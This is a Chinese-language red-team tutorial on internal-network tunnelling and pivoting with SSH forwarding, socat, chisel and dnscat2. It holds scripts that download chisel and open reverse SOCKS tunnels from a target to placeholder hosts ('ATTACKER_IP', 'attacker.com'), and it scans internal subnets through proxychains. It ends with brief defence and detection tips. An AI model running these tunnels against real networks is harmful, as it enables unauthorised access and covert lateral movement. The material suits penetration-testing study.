# 隧道与代理：SSH Tunnel、Socat、Chisel

隧道与代理技术是红队内网渗透的核心能力。通过建立隧道，可以将内网服务暴露到攻击者可控的网络，实现内网穿透。

---

## SSH端口转发

### SSH本地端口转发（Local Port Forwarding）

将本地端口的流量转发到远程目标。

```bash
# 基本语法
ssh -L [本地地址:]本地端口:目标地址:目标端口 用户名@跳板机IP

# 示例：将本地8080端口转发到内网Web服务器
ssh -L 8080:192.168.1.100:80 user@jumpbox

# 访问本地8080端口即可访问内网Web服务
curl http://localhost:8080
```

### SSH远程端口转发（Remote Port Forwarding）

将远程主机的端口流量转发到本地或内网目标。

```bash
# 基本语法
ssh -R [远程地址:]远程端口:目标地址:目标端口 用户名@远程服务器

# 示例：将VPS的8080端口转发到内网Web服务器
ssh -R 8080:192.168.1.100:80 user@vps_server

# 从VPS访问 localhost:8080 即可访问内网Web服务
```

### SSH动态端口转发（SOCKS代理）

创建SOCKS代理，所有通过代理的流量都会被转发。

```bash
# 基本语法
ssh -D [本地地址:]本地端口 用户名@跳板机

# 示例：创建SOCKS5代理
ssh -D 1080 user@jumpbox

# 使用proxychains配置
# /etc/proxychains.conf
# socks5 127.0.0.1 1080

# 通过代理执行命令
proxychains nmap -sT 192.168.1.0/24
```

### SSH转发实用技巧

```bash
# 后台运行SSH隧道
ssh -fNL 8080:192.168.1.100:80 user@jumpbox

# 使用autossh保持连接
autossh -M 0 -fNL 8080:192.168.1.100:80 user@jumpbox

# 使用sshpass自动输入密码
sshpass -p 'password' ssh -fNL 8080:192.168.1.100:80 user@jumpbox
```

---

## Socat代理

### 基础Socat转发

```bash
# TCP端口转发
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80

# UDP端口转发
socat UDP-LISTEN:53,fork UDP:192.168.1.100:53
```

### Socat代理服务器

```bash
# 创建简单代理
socat TCP-LISTEN:8080,fork TCP:TARGET:80

# 带日志的代理
socat TCP-LISTEN:8080,fork,reuseaddr SYSTEM:"echo 'Connection from:' >&2; socat - TCP:192.168.1.100:80"
```

### Socat加密代理

```bash
# 生成证书
openssl req -newkey rsa:2048 -nodes -keyout proxy.key -x509 -days 365 -out proxy.crt -subj "/CN=proxy"
cat proxy.key proxy.crt > proxy.pem

# 加密代理服务端
socat OPENSSL-LISTEN:4444,cert=proxy.pem,verify=0,fork TCP:192.168.1.100:80

# 加密代理客户端
socat TCP-LISTEN:8080,fork OPENSSL:VPS_IP:4444,verify=0
```

### Socat多端口代理

```bash
# 同时代理多个端口
socat TCP-LISTEN:80,fork TCP:192.168.1.100:80 &
socat TCP-LISTEN:443,fork TCP:192.168.1.100:443 &
socat TCP-LISTEN:3306,fork TCP:192.168.1.100:3306 &
```

---

## Chisel隧道

### Chisel简介

Chisel是一个基于HTTP/TLS的快速TCP/UDP隧道工具，使用Go语言编写，无需额外依赖。

### 安装Chisel

```bash
# 下载Chisel
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
chmod +x chisel_1.8.1_linux_amd64
mv chisel_1.8.1_linux_amd64 /usr/local/bin/chisel
```

### Chisel基本用法

```bash
# 攻击者 - 启动服务端
chisel server --reverse --port 8080

# 目标 - 连接服务端并创建SOCKS代理
chisel client ATTACKER_IP:8080 R:socks

# 目标 - 连接服务端并转发端口
chisel client ATTACKER_IP:8080 R:3306:127.0.0.1:3306
```

### Chisel高级用法

```bash
# 多端口转发
chisel client ATTACKER_IP:8080 R:8080:192.168.1.100:80 R:8443:192.168.1.100:443

# 反向SOCKS代理
chisel client ATTACKER_IP:8080 R:socks

# 正向SOCKS代理
chisel server --socks5 --port 1080

# 使用认证
chisel server --auth user:pass --port 8080
chisel client --auth user:pass ATTACKER_IP:8080 R:socks
```

### Chisel自动化脚本

```bash
#!/bin/bash
# chisel_tunnel.sh - 自动化Chisel隧道脚本

ATTACKER_IP="ATTACKER_IP"
ATTACKER_PORT=8080

echo "[+] 启动Chisel隧道..."

# 下载Chisel（如果不存在）
if [ ! -f /tmp/chisel ]; then
    wget -q https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz -O /tmp/chisel.gz
    gunzip /tmp/chisel.gz
    chmod +x /tmp/chisel
fi

# 启动隧道
/tmp/chisel client $ATTACKER_IP:$ATTACKER_PORT R:socks &
echo "[+] Chisel隧道已启动"
```

---

## SSH隧道自动化脚本

### 自动化SSH隧道管理器

```bash
#!/bin/bash
# ssh_tunnel_manager.sh - SSH隧道管理脚本

# 配置
JUMPBOX="user@jumpbox"
LOCAL_PORT=8080
REMOTE_TARGET="192.168.1.100:80"

# 启动隧道
start_tunnel() {
    echo "[+] 启动SSH隧道..."
    ssh -fNL $LOCAL_PORT:$REMOTE_TARGET $JUMPBOX
    echo "[+] 隧道已启动：localhost:$LOCAL_PORT -> $REMOTE_TARGET"
}

# 停止隧道
stop_tunnel() {
    echo "[+] 停止SSH隧道..."
    pkill -f "ssh -fNL $LOCAL_PORT"
    echo "[+] 隧道已停止"
}

# 检查隧道状态
check_tunnel() {
    if pgrep -f "ssh -fNL $LOCAL_PORT" > /dev/null; then
        echo "[+] 隧道运行中"
    else
        echo "[-] 隧道未运行"
    fi
}

# 主菜单
case "$1" in
    start)
        start_tunnel
        ;;
    stop)
        stop_tunnel
        ;;
    status)
        check_tunnel
        ;;
    *)
        echo "用法: $0 {start|stop|status}"
        ;;
esac
```

### 多跳SSH隧道

```bash
#!/bin/bash
# multi_hop_tunnel.sh - 多跳SSH隧道脚本

# 跳板机配置
HOP1="user1@10.0.0.1"
HOP2="user2@192.168.1.1"
TARGET="172.16.0.100:22"

echo "[+] 建立多跳SSH隧道..."

# 第一跳
ssh -L 2222:192.168.1.1:22 $HOP1 -fN

# 第二跳
ssh -L 3333:172.16.0.100:22 -p 2222 user2@127.0.0.1 -fN

# 连接目标
echo "[+] 隧道已建立，连接目标：ssh -p 3333 user@127.0.0.1"
```

### SSH隧道监控脚本

```bash
#!/bin/bash
# tunnel_monitor.sh - 监控隧道状态并自动重连

TUNNEL_CMD="ssh -fNL 8080:192.168.1.100:80 user@jumpbox"
CHECK_INTERVAL=60

while true; do
    # 检查隧道是否存活
    if ! pgrep -f "ssh -fNL 8080" > /dev/null; then
        echo "[-] 隧道断开，重新建立连接..."
        $TUNNEL_CMD
        echo "[+] 隧道已重新建立"
    fi
    
    sleep $CHECK_INTERVAL
done
```

---

## 内网穿透实战

### 场景1：穿透防火墙访问内网Web服务

```bash
# 攻击者VPS
ssh -R 8080:192.168.1.100:80 user@vps

# 从VPS访问内网Web服务
curl http://localhost:8080
```

### 场景2：通过跳板机访问数据库

```bash
# 建立隧道
ssh -L 3306:10.0.0.50:3306 user@jumpbox

# 连接数据库
mysql -h 127.0.0.1 -P 3306 -u dbuser -p
```

### 场景3：使用Chisel进行大规模内网扫描

```bash
# 攻击者 - 启动Chisel服务端
chisel server --reverse --port 8080

# 目标 - 启动Chisel客户端创建SOCKS代理
chisel client ATTACKER_IP:8080 R:socks

# 攻击者 - 使用proxychains进行内网扫描
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains nmap -sT -Pn 10.0.0.0/24
```

### 场景4：DNS隧道辅助

```bash
# 使用DNS隧道作为备份通道
# 攻击者 - 启动dnscat2服务器
dnscat2-server attacker.com

# 目标 - 启动dnscat2客户端
dnscat2 attacker.com

# 通过DNS隧道建立SOCKS代理
```

---

## 隧道工具对比

| 工具 | 协议 | 加密 | 易用性 | 稳定性 | 适用场景 |
|------|------|------|--------|--------|----------|
| SSH | TCP | 是 | 高 | 高 | 通用场景 |
| Socat | TCP/UDP | 可选 | 中 | 高 | 端口转发 |
| Chisel | HTTP | 是 | 高 | 中 | 内网穿透 |
| nc | TCP | 否 | 高 | 低 | 快速测试 |
| stunnel | TCP | 是 | 中 | 高 | 加密隧道 |

---

## 安全注意事项

### 防御措施

1. **监控异常连接**：定期检查系统网络连接
2. **限制SSH访问**：使用密钥认证，禁用密码登录
3. **网络分段**：限制内网横向移动
4. **日志审计**：记录所有SSH连接和端口转发
5. **入侵检测**：部署IDS/IPS系统

### 检测方法

```bash
# 检查SSH隧道
ps aux | grep ssh
netstat -tulnp | grep ssh

# 检查端口转发
lsof -i :8080

# 检查进程
pgrep -f "chisel\|socat"
```

---

*最后更新：2026-08-22*
